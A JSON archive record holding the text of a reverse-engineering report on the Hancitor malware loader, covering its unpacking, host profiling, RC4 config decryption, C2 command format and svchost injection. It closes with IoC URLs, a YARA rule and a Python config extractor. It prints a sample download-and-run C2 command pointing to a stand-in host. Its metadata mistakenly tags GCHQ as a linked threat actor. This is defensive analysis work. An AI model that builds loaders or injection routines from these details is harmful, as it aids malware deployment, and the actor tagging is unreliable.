@@ -1,0 +1,105 @@
+{
+    "id": "aa1723a1-8a06-4ea1-a277-f129f71e69b4",
+    "created_at": "2023-01-12T15:02:18.008158Z",
+    "updated_at": "2025-03-27T02:09:18.493357Z",
+    "deleted_at": null,
+    "sha1_hash": "c995fed9e68ab4c2c023ce18a24a4cb430e32efa",
+    "title": "2021-09-09 - Hancitor Loader - RE & Config Extraction",
+    "authors": "",
+    "file_creation_date": "2022-05-28T00:39:59Z",
+    "file_modification_date": "2022-05-28T00:39:59Z",
+    "file_size": 3411555,
+    "plain_text": "# Hancitor Loader\n\n**cyber-anubis.github.io/malware analysis/hancitor/**\n\n### Nidal Fikri\n\nHatching Triage Malware Research Analyst. Ex-Trend Micro Intern.\n\n13 minute read\n\n## Hancitor in a Nutshell\n\n\nSeptember 9, 2021\n\n\n-----\n\nHancitor is a famous malware loader that has been in use for years since first being observed in 2015. A\nmalware loader is the software which drops the actual malicious content on the system then executes the\nfirst stage of the attack. Hancitor has been the attacker’s loader of choice to deliver malwares like:\n**FickerStealer, Sendsafe, and Cobalt Strike if the victim characteristics are met. In recent months, more**\nthreat intelligence has been gathered to confirm the selection of Hancitor by Cuba Ransomware gangs as\nwell [[1]. The popularity of Hancitor among threat actors is considered to last for a while. Therefore, it’s](https://blog.group-ib.com/hancitor-cuba-ransomware)\ncrucial to assure your organization’s safety from this emerging threat.\n\n## Hancitor Infection Vector\n\nFigure(1): How Hancitor can sneak into your environment to download additional malwares.\n\nHancitor DLL is embedded within malicious documents delivered by phishing e-mails . The method that the\nmalicious document uses to achieve execution is usually a VBA macro that is executed when the document\nis opened. Being dropped by the doc file, the initial packed DLL is an intermediate stage responsible for\nunpacking and exposing the true functionality of Hancitor. Based on the collected information about the\nvictim host, it will decide which malware to deploy. Hancitor will then proceed to perform the loading\nfunctionality in order to infect the system with the actual malicious content.\n\n## Technical Summary\n\n1. Configuration Extraction: Hancitor comes with embedded RC4 encrypted configuration with hard\ncoded key. It uses the Microsoft Windows `CryptoAPI to do the decryption. These configuration`\ncontains the C2 which it will communicate with for further commands.\n2. Host Profiling: Hancitor will gather information about the host in order to decide which malicious\n\npayload will be downloaded as well as to generate a unique victim ID. For instance, if the host is\nconnected to an active directory domain, Cobalt Strike conditions are met. Collected information\ncontains: OS version, IP address, Domains trusts, Computer name & username.\n\n\n-----\n\n3. C2 Communication: The victim profile will be forwarded to the C2 to decide further orders. The\n\nreturned C2 command is base64 encoded with additional layer of single-byte XOR encryption. The\ncommand defines a set of 5 available loading techniques to be performed + a new URL to download\nthe additional malware to be loaded and executed.\n4. Payload Download: There are a lot of options to be selected. For example, Hancitor can download\n\nfully grown malicious EXE or DLL files, or even tightly crafted shellcodes. There is high degree of\nflexibility here that can serve a lot of threat actors which makes Hancitor a great choice.\n5. Malicious Code Execution: Whether it’s process injection or simply to drop on disk and execute the\n\nmalware, Hancitor is capable of performing the complex operation to ensure running that the malicious\ncode on the victim’s machine.\n\n## Technical Analysis\n\n First look & Unpacking\n\nFigure(2): Results are at 2021-08-26 14:38:31 UTC. Different results may appear.\n\nCatching the initial dropped DLL by the malicious document and inspecting it, it is first seen at 2021-08-26\n**14:38:31 UTC according to** [VirusTotal. At the given date, the file sample was flagged as malicious by only 6](https://www.virustotal.com/gui/file/efbdd00df327459c9db2ffc79b2408f7f3c60e8ba5f8c5ffd0debaff986863a8/detection/f-efbdd00df327459c9db2ffc79b2408f7f3c60e8ba5f8c5ffd0debaff986863a8-1629989820)\nsecurity vendors.\n\n\n-----\n\nFigure (3): Before & After view of the memory dump.\n\nTo unpack the dropped DLL, we use X64dbg to set a breakpoint on `VirtualAlloc API. After writing new`\ndata into the allocated memory space, we set a hardware breakpoint on execution there. We continue single\nstepping into the rest of the unpacking stub to assure the building of the import table. Then, we can spot a\nsuccessfully unpacked PE header as well as many resolved strings in the newly allocated memory space.\nFinally, we dump the memory section into disk.\n\n## Host Profiling\n\nFigure (4): All functions were labeled after RE.\n\nUsing IDA Pro we can see that unpacked Hancitor DLL has two exports which lead to the same function.\nFrom there our static code analysis will begin. The malware functionality begins with host profiling. Collected\ninformation contains: OS version, Victim’s IP address, Domains names & DNS names, Computer name,\nusername, and whether the machine is x64 or x86.\n\n\n-----\n\nFigure(5): The malware uses GetAdaptersAddresses to obtain the required info.\n\nIt creates a unique ID for the victim using its MAC addresses of all the connected adapters XORed with the\nWindows directory volume serial number.\n\nFigure(6): check_if_x64 routine is used to determine if the victim machine is x64 or not.\n\nThen, it concatenates the final string which will hold the collected host information to be sent to the C&C\nserver. The call to `mw_wrap_config_decryption routine will be discussed in details in a few lines. It’s`\nused to extract the embedded configuration which will also be used in the final host profile. Something that\ncan be very useful while YARA rules is the format string\n```\n{\"GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d\"} which makes a good indicator\n\n```\nfor Hancitor . These collected characteristics about the infected host will decide which malware will be\ndeployed. For instance, if the host is connected to an active directory domain, Cobalt Strike malware will be\ndownloaded and executed.\n\n## Configuration Extraction\n\n\n-----\n\nFigure(7): Hexadecimal representation of the data residing at the .data section.\n\nBut before finishing the host profile, the malware decrypts the embedded configuration in order to send a\ncopy to the C&C server. The decryption routine references two global data variables very close the\nbeginning of the .data section. From the way the parameters are arranged for the decryption routine, I’ve\nconcluded that the 8 bytes beginning at `0x5A5010 are the decryption key followed by the encrypted`\nconfiguration.\n\nFigure(8): You can use the MSDN documentation for more information about the APIs.\n\nHancitor comes with embedded RC4 encrypted configuration with hard-coded key. It uses the Microsoft\nWindows `CryptoAPI to do the decryption. First, the key will be SHA-1 hashed before attempting the`\ndecryption. Then only the first 5 bytes of the hashed key will be used to decrypt the encrypted data.\n\nThe upper 16 bits of the 4th parameter denotes the size of the RC4 decryption key. Here it’s `0x280011 =`\n```\n0000000000101000 -- 0000000000010001 in which 101000 = 40 bits or 5 bytes .\n\n```\nFigure(9): Screen-shot from the actual decrypted configuration the malware uses.\n\n[We can use CyberChef to simulate the decryption process statically. First, the 8 bytes key](https://gchq.github.io/CyberChef/)\n```\n{f0da08fe225d0a8f} will be SHA-1 hashed = {67f6c6259f8f4ef06797bbd25edc128fd64e6ad7} .\n\n```\nThen, the first 5 bytes of the key will be used as the final RC4 decryption key for decrypting the configuration\n\n\n-----\n\ndata. These configuration contains the C2 which it will communicate with for further commands based on the\ncollected host profile. Here at the bottom right corner, we can see that the malware comes with 3 C&C\nservers to try to connect with. At the end of this report, we will use another way to automatically extract the\nembedded configuration using Python.\n\n## C&C Communication\n\nFigure(10): The malware checks for 200 OK response before retrieving the C2 commands.\n\nHancitor extracts the C2 URLs and initializes the connection with the remote end using the high level\n```\nWininet.dll library APIs. It uses the following hard-coded User-Agent {\"Mozilla/5.0 (Windows NT\n6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko\"} which is very common.\n\n```\nFirst, the collected host profile is sent using HTTP POST request. Secondly, it accepts the matched C2\ncommand based on the gathered information about the victim. The received C2 command is base64\nencoded and XOR encrypted with a single-byte key `0x7A . The malware performs the necessary decoding`\nbefore interpreting the command.\n\nThe command consists of 4 parts:\n\n1. A character from the set `{'b','e','l','n','r'} to specify what action to be performed.`\n2. The colon character `: as delimiter.`\n3. URL of the malicious content to be downloaded.\n4. The bar character `| as delimiter.`\n\n\n-----\n\n```\n X:http://badsite.com/malware.exe|\n\n## Executing C2 Commands\n\n```\nFigure(11): Conditional code flows depending on the 1st character of the C2 command.\n\nAfter retrieving the C2 command and performing the appropriate decoding, the command is validated and\nthen passed to the routing in which it will download and execute the malicious content. The malicious\ncontent will be downloaded using the URL at offset 3 from the beginning of the C2 string. Then, based on\nthe first character of the C2 command, one of the switch case branches will be executed.\n\nThere are 5 available options or executions paths. Excluding the `n command because it simply acts as a`\n```\nNOP operation, so we have 4 valid options.\n\n### The ‘b’ Command\n\n```\nThis execution branch will perform a process injection in a newly created `svchost.exe process with`\n```\nCREATE_SUSPENDED flag. The injected malicious code is first checked to be a valid PE file -DLL or EXE- in\n\n```\norder to be injected. For the new suspended `svchost.exe process, the injection is done in a classic way`\nusing the APIs: `VirtualAllocEx and` `WriteProcessMemory . What is more interesting here is the way`\nthe malware sets the new Entry point for the malicious code.\n\nFigure(12): A thread context is a snapshot of processor-specific register data.\n\nIt changes the value of the `EAX register and sets the new thread context overwriting the old one. The` `EAX`\nregister in a newly created thread will always point to the OEP. This effectively transfers the entry point of\n\n\n-----\n\nthe newly created `svchost.exe process to the start of the injected malicious binary.`\n\n### The ‘e’ Command\n\nFigure(13): lpStartAddress parameter is a wrapper function which calls the OEP of the binary.\n\nThe difference between this execution branch and the previous one is that this performs execution of the\nmalicious binary inside the currently running process without touching `svchost.exe . First, Hancitor will`\nperform PE header parsing to find the `ImageBase and` `AddressOfEntryPoint fields.`\n\nThen, it will proceed to build the import table which will be used by the injected binary. It uses\n```\nLoadLibraryA and GetProcAddress to do the job. That’s because the newly created thread will crash if\n\n```\nit’s found to have dependencies problems. At last, based on function flags, the malware will decide to launch\nthe newly downloaded malicious in a new separate thread or simply just to call it as a function.\n\n### The ‘l’ Command\n\n\n-----\n\nFigure(14): The functions flags are: arg_inject_svchost and arg_create_new_thread which decide the\ninjection.\n\nHere the malware doesn’t check for valid PE file because it’s supposed to inject a shellcode. Based on the\nfunction’s flags, Hancitor will decide which to inject a newly created `svchost.exe or to call the malicious`\nshellcode as a function in the currently running process.\n\nThe malware doesn’t need to resume the suspended process because its only suspends the main thread.\nThe malware is creating another thread within `svchost.exe to execute the malicious shellcode.`\n\n### The ‘r’ Command\n\nFigure(15): %TEMP% directory is used to store ephemeral temporary files.\n\nThis execution path is the only one that actually drops files on the disk. Hancitor will drop the newly\ndownloaded malicious binary in the `%TEMP% directory with a random name beginning with the “BN” prefix.`\nThen, if it’s an EXE file, it will simply execute it in a new process. If it’s a DLL file, it will use\n```\nrun32dll exe to execute the malicious DLL\n\n```\n\n-----\n\n## Conclusion\n\nHancitor is considered a straightforward loader but very efficient at the same time. So far, Hancitor has\ntargeted companies of all sizes and in a wide variety of industries and countries to deploy very serious\nmalwares like FickerStealer, Sendsafe, and Cobalt Strike or even Cuba Ransomware. It’s a must to take\nthe appropriate countermeasures to defend your organization from such dreadful threat. We can’t be sure\nwhich threat actors will also use Hancitor as their loader in the future. Yet, one thing is sure: as effective as it\nhas been to date, the threat posed by Hancitor will not fade away in the coming future.\n\n## IoCs\n\n**No.** **Description** **Hash**\n\n\n1 The initial\ndropped\nDLL\n\n2 The\nunpacked\nDLL\n\n4 Hancitor\nC&C Server\n1\n\n5 Hancitor\nC&C Server\n2\n\n6 Hancitor\nC&C Server\n3\n\n## YARA Rule\n\n\nEFBDD00DF327459C9DB2FFC79B2408F7F3C60E8BA5F8C5FFD0DEBAFF986863A8\n\n5E74015E439AE6AA7E0A29F26EF2389663EB769D25ABCEB636D8272A74F27B7F\n\nhttp://intakinger.com/8/forum.php\n\nhttp://idgentexpliet.ru/8/forum.php\n\nhttp://declassivan.ru/8/forum.php\n\n\n-----\n\n```\n{\n     meta:\n          description = \"This is a noob rule for detecting unpacked Hancitor DLL\"\n          author = \"Nidal Fikri @cyber_anubis\"\n     strings:\n          $mz = {4D 5A} //PE File\n          $s1 = \"http://api.ipify.org\" ascii fullword\n          $s2 = /GUID=%I64u&BUILD=%s&INFO=%s(&EXT=%s)?&IP=%s&TYPE=1&WIN=%d\\.%d\\(x64\\)/ ascii\nfullword\n          $s3 = /GUID=%I64u&BUILD=%s&INFO=%s(&EXT=%s)?&IP=%s&TYPE=1&WIN=%d\\.%d\\(x32\\)/ ascii\nfullword\n          $s4 = \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko\"\nascii fullword\n     condition:\n          (filesize < 500KB) and ($mz at 0) and (3 of ($s*))\n}\n\n## Python Automated Configuration Extraction\n\n```\nThis python script is used to automatically extract the configuration of the Hancitor malware. Steps required\nare as follows:\n\nOpen the binary file.\nGet the .data section.\nExtract the the key and the encrypted configuration data at offset 16.\nSHA-1 hash the extracted key to get the final key.\nUse the key to decrypt the configurations.\n\n\n-----\n\n```\n p p p\nimport hashlib     #To perform the SHA-1 hashing\nimport binascii     #To perfrom unhexing\nimport arc4       #To perform the RC4 decryption\n#This functions creates a PE object. Then iterates over the sections to locate\n#the .data section in order to return its content\ndef Get_Date_Section(file):\n  pe_file = pefile.PE(file)\n  for section in pe_file.sections:\n    if b\".data\" in section.Name:\n      return section.get_data()\ndef rc4_decryption(key, encrypted_data):\n  cipher = arc4.ARC4(key)\n  decrypted_content = cipher.decrypt(encrypted_data)\n  extracted_config = decrypted_content[:200]\n  print(extracted_config.decode('utf-8')) #Prints in Unicode\ndef main():\n  file_path = input(\"Pls enter the file path: \")\n  data_section = Get_Date_Section(file_path)\n  #The config data begins at offset 16 inside the .data section\n  full_configuration = data_section[16:]\n  #The key is the first 8 bytes while the encrypted data is the rest\n  key = full_configuration[0:8]\n  data = full_configuration[8:]\n  #The RC4 key is only the first 5 bytes = 10 hex digits\n  hashed_key = hashlib.sha1(key).hexdigest()\n  rc4_key = hashed_key[0:10]\n  rc4_decryption(binascii.unhexlify(rc4_key),data)\nif __name__ == '__main__':\n  main()\n\n## Refrences\n\n```\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-09 - Hancitor Loader - RE & Config Extraction.pdf"
+    ],
+    "report_names": [
+        "2021-09-09 - Hancitor Loader - RE & Config Extraction.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
+            "created_at": "2022-10-25T16:07:23.667223Z",
+            "updated_at": "2025-03-27T02:02:09.916086Z",
+            "deleted_at": null,
+            "main_name": "GCHQ",
+            "aliases": [
+                "Government Communications Headquarters",
+                "Operation Socialist"
+            ],
+            "source_name": "ETDA:GCHQ",
+            "tools": [
+                "Prax",
+                "Regin",
+                "WarriorPride"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
+            "created_at": "2022-10-25T16:07:23.773944Z",
+            "updated_at": "2025-03-27T02:02:09.974695Z",
+            "deleted_at": null,
+            "main_name": "Lead",
+            "aliases": [
+                "Casper",
+                "TG-3279"
+            ],
+            "source_name": "ETDA:Lead",
+            "tools": [
+                "Agentemis",
+                "BleDoor",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "RbDoor",
+                "RibDoor",
+                "Winnti",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535738,
+    "ts_updated_at": 1743041358,
+    "ts_creation_date": 1653698399,
+    "ts_modification_date": 1653698399,
+    "files": {
+        "pdf": "https://archive.orkl.eu/c995fed9e68ab4c2c023ce18a24a4cb430e32efa.pdf",
+        "text": "https://archive.orkl.eu/c995fed9e68ab4c2c023ce18a24a4cb430e32efa.txt",
+        "img": "https://archive.orkl.eu/c995fed9e68ab4c2c023ce18a24a4cb430e32efa.jpg"
+    }
+}
